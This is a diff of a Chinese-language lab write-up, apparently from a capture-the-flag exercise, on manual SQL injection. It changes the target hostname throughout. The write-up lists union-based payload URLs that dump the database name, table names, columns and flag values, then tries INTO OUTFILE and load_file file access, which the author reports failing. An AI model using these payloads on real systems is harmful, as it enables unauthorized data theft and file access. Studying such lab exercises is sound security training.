@@ -17,7 +17,7 @@ keywords: SQL注入, oob带外, dnslog
 
 ### 引号探测
 
-使用 `http://injectx1.lab.aqlab.cn:81/Pass-02/index.php?id=1' and 1=1 --+`。 可以正常显示结果， 但 `1=2 --+` 不行。 
+使用 `http://vulhub.example.com:81/Pass-02/index.php?id=1' and 1=1 --+`。 可以正常显示结果， 但 `1=2 --+` 不行。 
 
 > 判断为 **单引号** 闭合。
 
@@ -27,13 +27,13 @@ keywords: SQL注入, oob带外, dnslog
 
 ```sql
 -- 1. 语句错误, 测试了 `select 1 到 7`。 都没发现可以显示的注入点。 
-http://injectx1.lab.aqlab.cn:81/Pass-02/index.php?id=1' and select 1,2,3,4,5,6,7 --+ 
+http://vulhub.example.com:81/Pass-02/index.php?id=1' and select 1,2,3,4,5,6,7 --+ 
 ```
 > 1. 首先`语句错误` ， 这里应该使用 **联合查询（UNION）** 确认注入点，而非 **AND**
 
 ```sql
 -- 2. 联合查询判断条件错误, 显示结果不提示注入点
-http://injectx1.lab.aqlab.cn:81/Pass-02/index.php?id=1' union select 1,2,3 --+ 1
+http://vulhub.example.com:81/Pass-02/index.php?id=1' union select 1,2,3 --+ 1
 ```
 > 2. 使用联合查询后使用 `id=1'` 并不能确认 `select 1,2,3` 的注入点， 因为 **UNION 求并集** 依旧会显示正常查询结果。 如图 *select-union-condition-miss.png* 所示
 
@@ -44,12 +44,12 @@ http://injectx1.lab.aqlab.cn:81/Pass-02/index.php?id=1' union select 1,2,3 --+ 1
 
 ```sql
 -- 1. 正确判断, --+ 注释
-http://injectx1.lab.aqlab.cn:81/Pass-02/index.php?id=1' and 1=2 union select 1,2,3 --+ 1
+http://vulhub.example.com:81/Pass-02/index.php?id=1' and 1=2 union select 1,2,3 --+ 1
 ```
 
 ```sql
 -- 2. 正确判断, # 号注释。 urlcode %23  = #
-http://injectx1.lab.aqlab.cn:81/Pass-02/index.php?id=1' and 1=2 union select 1,2,3 %23+ 1
+http://vulhub.example.com:81/Pass-02/index.php?id=1' and 1=2 union select 1,2,3 %23+ 1
 ```
 
 1. `id=1' and 1=2` : 闭合 **左单引号** ， 错误截断 。
@@ -72,7 +72,7 @@ http://injectx1.lab.aqlab.cn:81/Pass-02/index.php?id=1' and 1=2 union select 1,2
 
 ```sql
 -- dump dbname and tablename 
-http://injectx1.lab.aqlab.cn:81/Pass-02/index.php?id=1' and 1=2 union select 1, (select database()), (select group_concat(table_name) from information_schema.tables where table_schema=database()) --+ 1
+http://vulhub.example.com:81/Pass-02/index.php?id=1' and 1=2 union select 1, (select database()), (select group_concat(table_name) from information_schema.tables where table_schema=database()) --+ 1
 
 
 -- dbname: error
@@ -83,7 +83,7 @@ http://injectx1.lab.aqlab.cn:81/Pass-02/index.php?id=1' and 1=2 union select 1, 
 
 ```sql
 --- dump column name
-http://injectx1.lab.aqlab.cn:81/Pass-02/index.php?id=1' and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='error_flag' --+ 1
+http://vulhub.example.com:81/Pass-02/index.php?id=1' and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='error_flag' --+ 1
 
 
 -- columns: Id,flag
@@ -95,7 +95,7 @@ http://injectx1.lab.aqlab.cn:81/Pass-02/index.php?id=1' and 1=2 union select 1,2
 
 ```sql
 --- dump flag values
-http://injectx1.lab.aqlab.cn:81/Pass-02/index.php?id=1' and 1=2 union select 1,2,(select group_concat(flag) from error_flag) --+ 1
+http://vulhub.example.com:81/Pass-02/index.php?id=1' and 1=2 union select 1,2,(select group_concat(flag) from error_flag) --+ 1
 
 -- flags: zKaQ-Nf,zKaQ-BJY,zKaQ-XiaoFang,zKaq-98K
 ```
@@ -126,7 +126,7 @@ http://injectx1.lab.aqlab.cn:81/Pass-02/index.php?id=1' and 1=2 union select 1,2
 
 ```sql
 --- select database
-http://injectx1.lab.aqlab.cn:81/Pass-02/index.php?id=1' union all select database() INTO OUTFILE '/tmp/1.txt' --+ 1
+http://vulhub.example.com:81/Pass-02/index.php?id=1' union all select database() INTO OUTFILE '/tmp/1.txt' --+ 1
 
 ```
 
@@ -134,7 +134,7 @@ http://injectx1.lab.aqlab.cn:81/Pass-02/index.php?id=1' union all select databas
 
 ```sql
 --- select load_file
-http://injectx1.lab.aqlab.cn:81/Pass-02/index.php?id=1' and 1=2 union all select 1,2,(select load_file('/tmp/1.txt' )) --+ 1
+http://vulhub.example.com:81/Pass-02/index.php?id=1' and 1=2 union all select 1,2,(select load_file('/tmp/1.txt' )) --+ 1
 ```
 
 然而失败了。 T_T 。
